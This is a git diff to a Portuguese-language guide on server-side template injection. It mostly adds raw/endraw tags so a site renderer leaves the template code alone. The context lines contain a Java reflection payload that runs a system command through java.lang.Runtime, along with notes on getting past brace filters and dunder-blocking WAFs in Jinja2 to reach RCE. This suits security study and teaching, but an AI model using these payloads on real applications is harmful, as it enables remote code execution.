@@ -295,6 +295,7 @@ Por que SSTI é diferente do XSS:
 
 **Benefícios do padrão correto (template fixo + dados separados):**
 
+{% raw %}
 ```
 +---------------------------------------------+
 | Template fixo + variáveis de contexto:      |
@@ -308,6 +309,7 @@ Por que SSTI é diferente do XSS:
 |   (apenas editar o arquivo .html/.twig)     |
 +---------------------------------------------+
 ```
+{% endraw %}
 
 ---
 
@@ -748,12 +750,14 @@ $str.valueOf($chr.toChars($out.read()))
 
 #### RCE via Runtime
 
+{% raw %}
 ```
 {% set cmd = "id" %}
 {% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke((1).TYPE.forName('java.lang.Runtime').methods[7].invoke(null),cmd.split(" ")) %}
 {% set output = (1).TYPE.forName('java.io.InputStream').methods[2].invoke(bytes) %}
 {{ output }}
 ```
+{% endraw %}
 
 ---
 
@@ -795,7 +799,7 @@ ${x}
 ```
 {% endraw %}
 
-#### Contornar bloqueio de chaves duplas `{{ }}`
+#### Contornar bloqueio de chaves duplas `{% raw %}{{ }}{% endraw %}`
 
 {% raw %}
 ```python
@@ -845,7 +849,7 @@ ${x}
 
 Cenário: WAF ou filtro da aplicação bloqueia a string `.__` nos inputs de template Jinja2, impedindo notação de ponto para acessar dunder attributes.
 
-**Solução**: o filtro nativo Jinja2 `attr(name)` acessa atributos passando o nome como string — sem usar notação ponto. Combinado com `{% set %}` para armazenar nomes de dunders, permite construir a cadeia completa de RCE sem `.__` em nenhum momento.
+**Solução**: o filtro nativo Jinja2 `attr(name)` acessa atributos passando o nome como string — sem usar notação ponto. Combinado com `{% raw %}{% set %}{% endraw %}` para armazenar nomes de dunders, permite construir a cadeia completa de RCE sem `.__` em nenhum momento.
 
 {% raw %}
 ```python
